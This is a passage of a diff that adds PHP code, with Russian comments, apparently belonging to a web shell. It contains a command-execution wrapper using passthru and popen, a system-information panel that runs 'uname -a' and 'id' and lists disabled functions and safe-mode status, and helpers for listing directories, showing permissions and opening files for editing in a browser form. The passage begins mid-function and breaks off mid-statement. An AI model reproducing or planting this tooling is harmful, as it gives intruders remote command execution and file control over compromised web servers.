@@ -516,5 +516,103 @@ function ex($comd)                             //Выполнение команды
    }elseif(function_exists('passthru')){
     ob_start();
     passthru($comd);
-    $res=ob
-
+    $res=ob_get_contents();
+    ob_end_clean();
+   }elseif(is_resource($f=popen($comd,"r"))){
+    $res = "";
+    while(!feof($f)) { $res.=fread($f,1024); }
+    pclose($f);
+  }
+ }
+ return $res;
+}
+function sysinfo()                             //Вывод SYSINFO
+{
+ global $curl_on, $dis_func, $mysql_stat, $safe_mode, $server, $HTTP_SERVER_VARS;
+ echo("<b><font  face=Verdana size=2> System information:<br><font size=-2>
+      <hr>");
+ echo (($safe_mode)?("Safe Mode: </b><font color=green>ON</font><b> "):
+         ("Safe Mode: </b><font color=red>OFF</font><b> "));
+ $row_dis_func=explode(', ',$dis_func);
+ echo ("PHP: </b><font color=blue>".phpversion()."</font><b> ");
+ echo ("MySQL: </b>");
+ if($mysql_stat){
+  echo "<font color=green>ON </font><b>";
+ }
+ else {
+  echo "<font color=red>OFF </font><b>";
+ }
+ echo "cURL: </b>";
+ if($curl_on){
+  echo "<font color=green>ON</font><b><br>";
+ }else
+  echo "<font color=red>OFF</font><b><br>";
+ if ($dis_func!=""){
+  echo "Disabled Functions: </b><font color=red>".$dis_func."</font><br><b>";
+ }
+ $uname=ex('uname -a');
+ echo "OS: </b><font color=blue>";
+ if (empty($uname)){
+  echo (php_uname()."</font><br><b>");
+ }else
+  echo $uname."</font><br><b>";
+ $id = ex('id');
+ echo "SERVER: </b><font color=blue>".$server."</font><br><b>";
+ echo "id: </b><font color=blue>";
+ if (!empty($id)){
+  echo $id."</font><br><b>";
+ }else
+  echo "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid().
+       "</font><br><b>";
+ echo "<b>RemoteAddress:</b><font color=red>".$HTTP_SERVER_VARS['REMOTE_ADDR']."</font><br>";
+ if(isset($HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'])){
+  echo "<b>RemoteAddressIfProxy:</b><font color=red>".$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR']."</font>";
+ }
+ echo "<hr size=3 color=black>";
+ echo "</font></font>";
+}
+function read_dir($dir)                 //читаем папку
+{
+ $d=opendir($dir);
+ $i=0;
+ while($r=readdir($d)){
+  $res[$i]=$r;
+  $i++;
+ }
+ return $res;
+}
+function permissions($mode,$file) {            //определение свойств
+ $type=filetype($file);
+ $perms=$type[0];
+ $perms.=($mode & 00400) ? "r" : "-";
+ $perms.=($mode & 00200) ? "w" : "-";
+ $perms.=($mode & 00100) ? "x" : "-";
+ $perms.=($mode & 00040) ? "r" : "-";
+ $perms.=($mode & 00020) ? "w" : "-";
+ $perms.=($mode & 00010) ? "x" : "-";
+ $perms.=($mode & 00004) ? "r" : "-";
+ $perms.=($mode & 00002) ? "w" : "-";
+ $perms.=($mode & 00001) ? "x" : "-";
+ $perms.="(".$mode.")";
+ return $perms;
+}
+function open_file($fil, $m, $d)                          //Открыть файл
+{
+ if (!($fp=fopen($fil,$m))) {
+  $res="Error opening file!\n";
+ }else{
+  ob_start();
+  readfile($fil);
+  $res=ob_get_contents();
+  ob_end_clean();
+  if (!(fclose($fp))){
+   $res="ERROR CLOSE";
+  }
+ }
+ echo "<form action=\"".$HTTP_REFERER."\" method=\"POST\" enctype=\"multipart/form-data\">";
+ echo "<input type=\"hidden\" value='".$r_act."' name=\"r_act\">";
+ echo "<table BORDER=1 align=center>";
+ echo "<tr><td alling=center><b>   ".$fil."   </b></td></tr>";
+ echo "<tr><td alling=center><textarea name=\"text\" cols=90 rows=15>";
+ echo $res;
+ echo "
